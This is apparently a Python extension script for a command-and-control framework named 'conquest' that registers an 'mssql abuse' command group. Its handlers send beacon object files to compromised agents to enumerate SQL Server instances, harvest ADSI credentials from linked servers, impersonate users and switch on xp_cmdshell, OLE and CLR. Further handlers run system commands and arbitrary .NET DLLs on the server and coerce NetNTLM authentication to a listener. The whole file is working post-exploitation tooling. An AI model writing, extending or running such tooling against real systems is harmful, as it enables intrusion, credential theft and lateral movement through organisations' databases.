import conquest
import os.path 

SCRIPT_DIR = os.path.dirname(__file__)

cmd_1434udp = (
    conquest.createCommand(name="sql-1434udp", description="Enumerate SQL Server connection information.", example="sql-1434udp sql01.conquest.local",
                           message="Tasked agent to enumerate SQL Server connection information.", mitre=[])
            .addArgString("server", "IP address of the SQL server instance.", True)
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/1434udp/1434udp.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("z", [
                    server      # z: Server IP
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_adsi = (
    conquest.createCommand(name="sql-adsi", description="Obtain ADSI credentials from a linked server.", example="sql-adsi ADSI-server --server sql01.conquest.local --impersonate sa",
                           message="Tasked agent to obtain ADSI credentials from a linked server.", mitre=[])
            .addArgString("adsi-server", "IP address of the ADSI linked server.", True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagInt("--port", "port", "ADSI port (default: 4444).", False, 4444)
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                adsi := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                port := conquest.get_int(args, 2),
                db := conquest.get_string(args, 3),
                link := conquest.get_string(args, 4),
                impersonate := conquest.get_string(args, 5),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/adsi/adsi.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    adsi,           # z: ADSI server
                    str(port)       # z: ADSI port
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_agentcmd = (
    conquest.createCommand(name="sql-agentcmd", description="Execute a system command using agent jobs.", example="sql-agentcmd whoami /all --server sql01.conquest.local",
                           message="Tasked agent to execute a system command using agent jobs.", mitre=[])
            .addArgString("command", "Command to execute.", True, "", -1)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                command := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),    

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/agentcmd/agentcmd.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    command         # z: Command to execute
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_agentstatus = (
    conquest.createCommand(name="sql-agentstatus", description="Enumerate SQL Agent status and jobs.", example="sql-agentstatus --server sql01.conquest.local",
                           message="Tasked agent to enumerate SQL Agent status and jobs.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/agentstatus/agentstatus.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_checkrpc = (
    conquest.createCommand(name="sql-checkrpc", description="Enumerate RPC status of linked servers.", example="sql-checkrpc --server sql01.conquest.local",
                           message="Tasked agent to enumerate RPC status of linked servers.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),    

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/checkrpc/checkrpc.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _clr(agentId, cmdline, args):
    dllName, dllBytes = conquest.get_file(args, 0)
    function = conquest.get_string(args, 1)
    server = conquest.get_string(args, 2)
    db = conquest.get_string(args, 3)
    link = conquest.get_string(args, 4)
    impersonate = conquest.get_string(args, 5)

    bof = os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/clr/clr.{conquest.arch(agentId)}.o")
    params = conquest.bof_pack("zzzzzb", [
        server,         # z: Server IP
        db,             # z: Database
        link,           # z: Linked server
        impersonate,    # z: User to impersonate
        function,       # z: Entry point function
        dllBytes        # b: DLL bytes
    ])

    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else: 
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_clr = (
    conquest.createCommand(name="sql-clr", description="Load and execute .NET assembly in a stored procedure.", example="sql-clr payload.dll MyFunction --server sql01.conquest.local",
                           message="Tasked agent to load and execute .NET assembly in a stored procedure.", mitre=[])
            .addArgFile("dll", "Path to the .NET assembly DLL.", True)
            .addArgString("function", "Name of the DLL entry point function.", True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(_clr)
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_columns = (
    conquest.createCommand(name="sql-columns", description="Enumerate columns within a table.", example="sql-columns users --server sql01.conquest.local",
                           message="Tasked agent to enumerate columns within a table.", mitre=[])
            .addArgString("table", "Table to enumerate columns from.", True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                table := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/columns/columns.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    table,          # z: Table
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_databases = (
    conquest.createCommand(name="sql-databases", description="Enumerate SQL databases.", example="sql-databases --server sql01.conquest.local",
                           message="Tasked agent to enumerate SQL databases.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/databases/databases.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

SQL_MODULES = {
    "clr":          "clr enabled",
    "ole":          "Ole Automation Procedures",
    "xp_cmdshell":  "xp_cmdshell",
    "rpc":          "rpc",
}

def _toggle(enable):
    def handler(agentId, cmdline, args):
        module = conquest.get_string(args, 0)
        server = conquest.get_string(args, 1)
        db = conquest.get_string(args, 2)
        link = conquest.get_string(args, 3)
        impersonate = conquest.get_string(args, 4)

        if module not in SQL_MODULES:
            conquest.error(agentId, f"Unknown module: {module}", cmdline)
            return

        moduleName = SQL_MODULES[module]
        if module == "rpc":
            value = "TRUE" if enable else "FALSE"
            if not link:
                conquest.error(agentId, f"Missing required flag: --linked-server", cmdline)
                return
        else:
            value = "1" if enable else "0"

        bof = os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/togglemodule/togglemodule.{conquest.arch(agentId)}.o")
        if not os.path.exists(bof):
            conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            return

        params = conquest.bof_pack("zzzzzz", [
            server,         # z: Server IP
            db,             # z: Database
            link,           # z: Linked server
            impersonate,    # z: User to impersonate
            moduleName,     # z: Module
            value           # z: Value
        ])

        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    return handler

cmd_enable = (
    conquest.createCommand(name="sql-enable", description="Enable a SQL server module.", example="sql-enable clr --server sql01.conquest.local",
                           message="Tasked agent to enable a SQL server module.", mitre=[])
            .addArgString("module", """Module to enable. 
Available options:
  - clr
  - ole 
  - xp_cmdshell
  - rpc (requires --linked-server flag)
            """, True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(_toggle(True))
).registerToGroup("mssql abuse")

cmd_disable = (
    conquest.createCommand(name="sql-disable", description="Disable a SQL server module.", example="sql-disable clr --server sql01.conquest.local",
                           message="Tasked agent to disable a SQL server module.", mitre=[])
            .addArgString("module", """Module to disable. 
Available options:
  - clr
  - ole 
  - xp_cmdshell
  - rpc (requires --linked-server flag)
            """, True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(_toggle(False))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_impersonate = (
    conquest.createCommand(name="sql-impersonate", description="Enumerate users that can be impersonated.", example="sql-impersonate --server sql01.conquest.local",
                           message="Tasked agent to enumerate users that can be impersonated.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/impersonate/impersonate.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zz", [
                    server,         # z: Server IP
                    db              # z: Database
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_info = (
    conquest.createCommand(name="sql-info", description="Gather information about the SQL server.", example="sql-info --server sql01.conquest.local",
                           message="Tasked agent to gather information about the SQL server.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/info/info.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zz", [
                    server,         # z: Server IP
                    db              # z: Database
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_links = (
    conquest.createCommand(name="sql-links", description="Enumerate linked servers.", example="sql-links --server sql01.conquest.local",
                           message="Tasked agent to enumerate linked servers.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/links/links.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_olecmd = (
    conquest.createCommand(name="sql-olecmd", description="Execute a system command using OLE Automation Procedures.", example="sql-olecmd whoami --server sql01.conquest.local",
                           message="Tasked agent to execute a system command using OLE Automation Procedures.", mitre=[])
            .addArgString("command", "Command to execute.", True, "", -1)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                command := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/olecmd/olecmd.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    command         # z: Command to execute
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_query = (
    conquest.createCommand(name="sql-query", description="Execute a custom SQL query.", example="sql-query \"SELECT name FROM master.dbo.sysdatabases\" --server sql01.conquest.local",
                           message="Tasked agent to execute a custom SQL query.", mitre=[])
            .addArgString("query", "SQL query to execute.", True, "", -1)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                query := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/query/query.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    query           # z: SQL query
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_rows = (
    conquest.createCommand(name="sql-rows", description="Get the count of rows in a table.", example="sql-rows users --server sql01.conquest.local",
                           message="Tasked agent to get the count of rows in a table.", mitre=[])
            .addArgString("table", "Table to count rows from.", True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                table := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/rows/rows.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    table,          # z: Table
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_search = (
    conquest.createCommand(name="sql-search", description="Search a table for a column name.", example="sql-search password --server sql01.conquest.local",
                           message="Tasked agent to search a table for a column name.", mitre=[])
            .addArgString("keyword", "Column name keyword to search for.", True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                keyword := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/search/search.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    keyword         # z: Keyword to search for
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_smb = (
    conquest.createCommand(name="sql-smb", description="Coerce NetNTLM auth via xp_dirtree.", example="sql-smb \\\\10.10.10.1\\share --server sql01.conquest.local",
                           message="Tasked agent to coerce NetNTLM auth via xp_dirtree.", mitre=[])
            .addArgString("listener", "UNC path to the listener (e.g. \\\\host\\share).", True)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                listener := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/smb/smb.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    listener        # z: UNC path
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_tables = (
    conquest.createCommand(name="sql-tables", description="Enumerate tables within a database.", example="sql-tables --server sql01.conquest.local",
                           message="Tasked agent to enumerate tables within a database.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/tables/tables.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_users = (
    conquest.createCommand(name="sql-users", description="Enumerate users with database access.", example="sql-users --server sql01.conquest.local",
                           message="Tasked agent to enumerate users with database access.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/users/users.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_whoami = (
    conquest.createCommand(name="sql-whoami", description="Gather logged in user, mapped user and roles.", example="sql-whoami --server sql01.conquest.local",
                           message="Tasked agent to gather logged in user, mapped user and roles.", mitre=[])
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                server := conquest.get_string(args, 0),
                db := conquest.get_string(args, 1),
                link := conquest.get_string(args, 2),
                impersonate := conquest.get_string(args, 3),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/whoami/whoami.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate     # z: User to impersonate
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_xpcmdshell = (
    conquest.createCommand(name="sql-xpcmdshell", description="Execute a system command via xp_cmdshell.", example="sql-xpcmdshell whoami --server sql01.conquest.local",
                           message="Tasked agent to execute a system command via xp_cmdshell.", mitre=["T1059.003"])
            .addArgString("command", "Command to execute.", True, "", -1)
            .addFlagString("--server", "server", "IP address of the SQL server instance (default: local computer).", False, "localhost")
            .addFlagString("--db", "database", "Database to use (default: master).", False, "master")
            .addFlagString("--linked-server", "server", "Execute command through linked server.")
            .addFlagString("--impersonate", "user", "User to impersonate during execution.")
            .setHandler(lambda agentId, cmdline, args: (
                command := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),
                db := conquest.get_string(args, 2),
                link := conquest.get_string(args, 3),
                impersonate := conquest.get_string(args, 4),

                bof := os.path.join(SCRIPT_DIR, f"SQL-BOF/SQL/xpcmd/xpcmd.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("zzzzz", [
                    server,         # z: Server IP
                    db,             # z: Database
                    link,           # z: Linked server
                    impersonate,    # z: User to impersonate
                    command         # z: Command to execute
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("mssql abuse")

